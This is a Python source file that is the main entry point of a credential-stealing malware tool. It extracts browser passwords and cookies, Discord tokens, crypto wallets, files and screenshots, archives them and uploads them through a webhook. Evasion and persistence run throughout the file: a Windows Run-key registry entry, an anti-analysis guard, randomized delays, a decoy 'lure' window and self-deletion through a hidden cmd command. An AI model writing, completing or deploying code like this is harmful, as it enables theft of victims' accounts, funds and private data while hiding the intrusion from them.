"""Entry point: guard, collect, archive, deliver, repeat."""

import glob
import os
import random
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
import time
import uuid

try:
    import config
except ModuleNotFoundError:
    raise SystemExit(
        "config.py is missing: copy config.example.py to config.py, or run builder.py."
    )
from core import browsers, discord, files, guard, screenshot, sysinfo, upload, wallets
from core.util import NO_WINDOW, Staging, human_size, make_archive

COLLECTORS = (
    ("sysinfo", sysinfo.collect),
    ("passwords", browsers.extract_passwords),
    ("cookies", browsers.extract_cookies),
    ("discord", discord.extract),
    ("wallets", wallets.extract),
    ("files", files.extract),
    ("screenshot", screenshot.collect),
)


def _collect(stage, errors):
    for name, func in COLLECTORS:
        try:
            func(stage)
        except Exception as exc:
            errors.append("%s: %s: %s" % (name, type(exc).__name__, exc))


def _snapshot():
    stage_dir = tempfile.mkdtemp(prefix="ng_")
    stage = Staging(stage_dir, config.MAX_UPLOAD_MB * 1024 * 1024)
    errors = []
    _collect(stage, errors)
    stage.add_text("meta", "errors.txt", "\n".join(errors) or "none")
    stage.write_manifest()
    archive = os.path.join(tempfile.gettempdir(), "ng_" + uuid.uuid4().hex + ".zip")
    make_archive(stage_dir, archive)
    summary = {
        "host": socket.gethostname(),
        "user": os.environ.get("USERNAME", "?"),
        "files": len(stage.entries),
        "size": human_size(os.path.getsize(archive)),
        "categories": ", ".join(stage.categories) or "-",
        "time": time.strftime("%Y-%m-%d %H:%M:%S"),
    }
    shutil.rmtree(stage_dir, ignore_errors=True)
    return archive, summary


def _wipe(archive):
    for path in glob.glob(archive + "*"):
        try:
            os.remove(path)
        except OSError:
            pass


def _self_delete():
    target = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)
    try:
        subprocess.Popen(
            ["cmd.exe", "/c", 'ping -n 8 127.0.0.1 >nul & del /f /q "%s"' % target],
            creationflags=NO_WINDOW,
        )
    except OSError:
        pass


def persist():
    if not getattr(sys, "frozen", False):
        return
    import winreg

    folder = os.path.join(os.environ.get("APPDATA", ""), config.APP_NAME)
    target = os.path.join(folder, os.path.basename(sys.executable))
    try:
        os.makedirs(folder, exist_ok=True)
        if os.path.abspath(sys.executable) != os.path.abspath(target):
            shutil.copy2(sys.executable, target)
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE,
        )
        try:
            winreg.SetValueEx(key, config.APP_NAME, 0, winreg.REG_SZ, '"%s"' % target)
        finally:
            winreg.CloseKey(key)
    except OSError:
        pass


def job():
    if config.PERSIST:
        persist()
    if config.GUARD and guard.blocked():
        return
    if config.DELAY_MINUTES > 0:
        time.sleep(config.DELAY_MINUTES * 60 * random.uniform(0.9, 1.1))

    while True:
        archive, summary = _snapshot()
        delivered = upload.deliver(archive, summary)
        attempts = 0
        while not delivered and config.WEBHOOK and attempts < 5:
            attempts += 1
            time.sleep(max(1, config.RETRY_MINUTES) * 60 * random.uniform(0.9, 1.1))
            delivered = upload.deliver(archive, summary)
        _wipe(archive)
        if config.REPEAT_HOURS <= 0:
            break
        time.sleep(config.REPEAT_HOURS * 3600 * random.uniform(0.9, 1.1))

    if config.SELF_DELETE:
        _self_delete()


def main():
    worker = threading.Thread(target=job, name="worker")
    worker.start()
    if config.SILENT:
        worker.join()
        return
    try:
        import lure

        lure.show()
    except Exception:
        worker.join()


if __name__ == "__main__":
    main()
